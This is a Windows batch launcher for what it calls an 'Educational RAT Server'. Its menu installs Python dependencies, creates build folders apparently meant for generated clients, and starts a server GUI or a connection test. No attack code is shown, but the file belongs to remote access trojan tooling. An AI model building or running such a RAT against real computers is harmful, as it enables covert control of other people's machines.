@echo off
echo ==========================================================
echo Educational RAT Server - Setup and Run Tool
echo ==========================================================
echo WARNING: This project is for educational purposes only
echo.

:menu
echo Select an option:
echo 1. Install dependencies
echo 2. Run server GUI
echo 3. Test connection
echo 4. Exit
echo.
set /p choice="Enter your choice (1-4): "

if "%choice%"=="1" goto install
if "%choice%"=="2" goto run_server
if "%choice%"=="3" goto test_connection
if "%choice%"=="4" goto end
goto menu

:install
echo.
echo Installing required packages...
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
echo.
echo Creating required directories...
if not exist "dist" mkdir dist
if not exist "builds\clients" mkdir builds\clients
echo.
echo Installation complete!
echo.
pause
goto menu

:run_server
echo.
echo Starting server GUI...
python server_gui.py
goto menu

:test_connection
echo.
echo Running connection test...
python test_connection.py
goto menu

:end
echo.
echo Goodbye!
exit 